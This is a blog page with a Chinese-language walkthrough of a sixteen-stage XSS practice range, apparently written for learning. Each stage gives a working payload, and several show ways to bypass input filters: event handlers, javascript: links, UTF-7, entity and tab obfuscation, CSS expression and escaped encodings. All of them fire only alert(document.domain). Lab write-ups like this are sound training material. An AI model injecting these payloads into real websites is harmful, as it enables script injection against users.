@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -XSS," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言考试周摆烂，被复习压得身心俱疲，做会靶场透透气，巩固下xss。这个靶场的要求就是注入alert(document.domain)。  写在前面地址：xss challenge如果遇到需要使用IE的情况但是又没有对应版本，可以在控制台中直接执行alert(document.domain)跳关。 stage 1Hint：very simple… 确实简单，没有做任何过滤，直接写入就可以了： 1&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss challenges">
+<meta property="og:url" content="http://example.com/2021/12/29/xss-challenges/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言考试周摆烂，被复习压得身心俱疲，做会靶场透透气，巩固下xss。这个靶场的要求就是注入alert(document.domain)。  写在前面地址：xss challenge如果遇到需要使用IE的情况但是又没有对应版本，可以在控制台中直接执行alert(document.domain)跳关。 stage 1Hint：very simple… 确实简单，没有做任何过滤，直接写入就可以了： 1&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2021/12/30/Fc8pLm9znCqiRIW.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/30/JWR4OzLNKUCtyPI.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/30/JX9Fo5Lufzl2nhA.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/30/SjDb4W7NMq1mGEw.png">
+<meta property="article:published_time" content="2021-12-29T13:54:19.000Z">
+<meta property="article:modified_time" content="2021-12-30T07:34:30.384Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2021/12/30/Fc8pLm9znCqiRIW.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/12/29/xss-challenges/"/>
+
+
+
+
+
+  <title>xss challenges | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/29/xss-challenges/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xss challenges</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-12-29T21:54:19+08:00">
+                2021-12-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>考试周摆烂，被复习压得身心俱疲，做会靶场透透气，巩固下xss。这个靶场的要求就是注入<code>alert(document.domain)</code>。</p>
+</blockquote>
+<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>地址：<a target="_blank" rel="noopener" href="https://xss-quiz.int21h.jp/">xss challenge</a><br>如果遇到需要使用IE的情况但是又没有对应版本，可以在控制台中直接执行<code>alert(document.domain)</code>跳关。</p>
+<h1 id="stage-1"><a href="#stage-1" class="headerlink" title="stage 1"></a>stage 1</h1><p>Hint：very simple…</p>
+<p>确实简单，没有做任何过滤，直接写入就可以了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="stage-2"><a href="#stage-2" class="headerlink" title="stage 2"></a>stage 2</h1><p>Hint: close the current tag and add SCRIPT tag…</p>
+<p>如果不看提示的话去看源码也是可以发现注入时要记得闭合引号与标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;p1&quot; size=&quot;50&quot; value=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>因此构建payload时要顺便闭合tag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="stage-3"><a href="#stage-3" class="headerlink" title="stage 3"></a>stage 3</h1><p>Hint: The input in text box is properly escaped.</p>
+<p>文本框中的输入已经正确转义，这告诉我们别想从文本框中进行注入，但是我们发现后面又多了一个选择框，那么我们可以进行抓包将xss语句写入p2中：<br><img src="https://s2.loli.net/2021/12/30/Fc8pLm9znCqiRIW.png"></p>
+<h1 id="stage-4"><a href="#stage-4" class="headerlink" title="stage 4"></a>stage 4</h1><p>Hint: invisible input field</p>
+<p>隐藏的写入点，我们翻翻源码，发现居然藏了一个隐藏的p3注入点，或者直接抓包也可以看见这个注入点，直接在p3写入xss就行了。同样要注意闭合value，构建xss：<br><img src="https://s2.loli.net/2021/12/30/JWR4OzLNKUCtyPI.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1=1&amp;p2=Japan&amp;p3=&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="stage-5"><a href="#stage-5" class="headerlink" title="stage 5"></a>stage 5</h1><p>Hint: length limited text box</p>
+<p>限制了text的长度，这种题我们之前也有接触过。由于限制长度一般写在了前端，我们可以直接更改前端的JS绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;p1&quot; maxlength=&quot;100&quot; size=&quot;30&quot; value=&quot;&quot; &gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后写入xss就行了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者直接bp抓包提交也是可以的。</p>
+<h1 id="stage-6"><a href="#stage-6" class="headerlink" title="stage 6"></a>stage 6</h1><p>Hint: event handler attributes</p>
+<p>输入点仍是value，但是发现<code>&lt;&gt;</code>被html特殊字符替代，那么我们在这里考虑添加事件<code>onclick</code>，当按钮被点击时触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(document.domain)&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="stage-7"><a href="#stage-7" class="headerlink" title="stage 7"></a>stage 7</h1><p>Hint: nearly the same… but a bit more tricky.</p>
+<p>将第二关的payload写入发现整段payload都被包进了value当中，这是由于双引号被过滤了导致闭合不能成功。不过使用上一关的payload还是可行的:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(document.domain)；</span><br></pre></td></tr></table></figure>
+<p>当然用其他事件标签也是可以的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=alert(document.domain) //鼠标指针指向指定内容时执行事件</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="stage-8"><a href="#stage-8" class="headerlink" title="stage 8"></a>stage 8</h1><p>Hint: the ‘javascript’ scheme.</p>
+<p>随便输入一个值，提交后查看源码：<br><img src="https://s2.loli.net/2021/12/30/JX9Fo5Lufzl2nhA.png"></p>
+<p>发现这个值被包裹在了<code>&lt;a&gt;</code>中，那么我们只需要在标签中添加一个JavaScript伪链接并点击即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain)</span><br></pre></td></tr></table></figure>
+
+<h1 id="stage-9"><a href="#stage-9" class="headerlink" title="stage 9"></a>stage 9</h1><p>Hint: UTF-7 XSS</p>
+<p>这关着实有点离谱，提示要我们将payload构造为utf-7编码同时过滤了<code>&lt;&gt;</code>，而这需要使用IE7浏览器，但是我没有，那就直接放个payload吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1=1%2bACI- οnmοuseοver=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&amp;charset=UTF-7</span><br></pre></td></tr></table></figure>
+
+<h1 id="stage-10"><a href="#stage-10" class="headerlink" title="stage 10"></a>stage 10</h1><p>Hint: s/domain//g;</p>
+<p>同样先写入查看源码，发现domain被过滤了，直接双写绕过即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.dodomainmain)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="stage-11"><a href="#stage-11" class="headerlink" title="stage 11"></a>stage 11</h1><p>Hint: “s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;”　</p>
+<p>提示意味着script和onclick都被过滤了，这里我们用标签制作超链接，并且使用制表符（回车符、换行符等等不可见字符）来绕过正则匹配：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascr&amp;#09;ipt:alert(document.domain);&quot;&gt;gonext&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者把s进行html实体化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=java&amp;#115;cript:alert(document.domain)&gt;gonext&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="stage-12"><a href="#stage-12" class="headerlink" title="stage 12"></a>stage 12</h1><p>Hint: “s/[\x00-\x20&lt;&gt;&quot;&#39;]//g;”</p>
+<p><code>&lt;&gt;</code>、双引号、空格都被过滤了，这里要利用IE浏览器的一个特性，IE浏览器会将两个反引号识别为双引号，因此我们构建payload：<br><img src="https://s2.loli.net/2021/12/30/SjDb4W7NMq1mGEw.png"></p>
+<h1 id="stage-13"><a href="#stage-13" class="headerlink" title="stage 13"></a>stage 13</h1><p>Hint: style attribute</p>
+<p>这里要运用到css的知识以及IE8，因此没法直接演示，就大致讲下原理。由于在IE下能在CSS中运行JS代码，因此我们可以构建CSS代码并在其中写入js使IE执行xss。过滤了<code>&lt;&gt;</code>和<code>&quot;</code>，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xss:expression(alert(document.domain));</span><br><span class="line">background:url(javascript:alert(&#x27;xss&#x27;));</span><br></pre></td></tr></table></figure>
+
+<h1 id="stage-14"><a href="#stage-14" class="headerlink" title="stage 14"></a>stage 14</h1><p>Hint: s/(url|script|eval|expression)/xxx/ig; </p>
+<p>同上一关，但是过滤了<code>url``script``eval``expression</code>四个关键字，这里直接使用注释符打断就可以了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xss:expr\0ession(alert(document.domain));</span><br><span class="line">xss:expr/**/ession(alert(document.domain));</span><br></pre></td></tr></table></figure>
+
+<h1 id="stage-15"><a href="#stage-15" class="headerlink" title="stage 15"></a>stage 15</h1><p>Hint: document.write(); </p>
+<p>这关直接过滤了<code>document.write()</code>和<code>\</code>，转义了<code>&lt;&gt;</code>、<code>&quot;</code>、<code>&amp;</code>，双写反斜杠并且进行编码就可以绕过了,16进制、8进制、unicode编码等等都是可以的，构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">十六进制： \\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</span><br><span class="line">八进制： \\74cscript\\76ealert(document.domain);\\74/script\\76</span><br><span class="line">unicode： \\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</span><br></pre></td></tr></table></figure>
+
+<h1 id="stage-16"><a href="#stage-16" class="headerlink" title="stage 16"></a>stage 16</h1><p>Hint: “document.write();” and “s/\x/\\x/ig;</p>
+<p>把<code>\\x</code>替换成了<code>\\\\x</code>，因此这里不能使用十六进制编码，因此使用上一关的八进制或者unicode编码都是可以的，这里换一种写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Unicode: \\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</span><br><span class="line">八进制: \\74img src=x οnerrοr=alert(document.domain)\\76</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>由于这个环境太古老了，因此有些只能在IE上跑，而且有些xss已经有点过时了，不过有些思路还是值得学习的，之后会做新的xss题目来继续巩固。</p>
+<p>先总结引号被过滤的几种情况：</p>
+<ol>
+<li>添加属性（onmouseover或onmouseout事件等以及expression）触发弹窗</li>
+<li><code>&quot;``&lt;&gt;</code>都被过滤时可以构造编码</li>
+<li>利用IE浏览器反引号翻译成双引号的特性</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-XSS/" rel="tag"># -web -XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/12/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" rel="next" title="php弱类型绕过总结">
+                <i class="fa fa-chevron-left"></i> php弱类型绕过总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number"></span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-1"><span class="nav-number"></span> <span class="nav-text">stage 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-2"><span class="nav-number"></span> <span class="nav-text">stage 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-3"><span class="nav-number"></span> <span class="nav-text">stage 3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-4"><span class="nav-number"></span> <span class="nav-text">stage 4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-5"><span class="nav-number"></span> <span class="nav-text">stage 5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-6"><span class="nav-number"></span> <span class="nav-text">stage 6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-7"><span class="nav-number"></span> <span class="nav-text">stage 7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-8"><span class="nav-number"></span> <span class="nav-text">stage 8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-9"><span class="nav-number"></span> <span class="nav-text">stage 9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-10"><span class="nav-number"></span> <span class="nav-text">stage 10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-11"><span class="nav-number"></span> <span class="nav-text">stage 11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-12"><span class="nav-number"></span> <span class="nav-text">stage 12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-13"><span class="nav-number"></span> <span class="nav-text">stage 13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-14"><span class="nav-number"></span> <span class="nav-text">stage 14</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-15"><span class="nav-number"></span> <span class="nav-text">stage 15</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stage-16"><span class="nav-number"></span> <span class="nav-text">stage 16</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
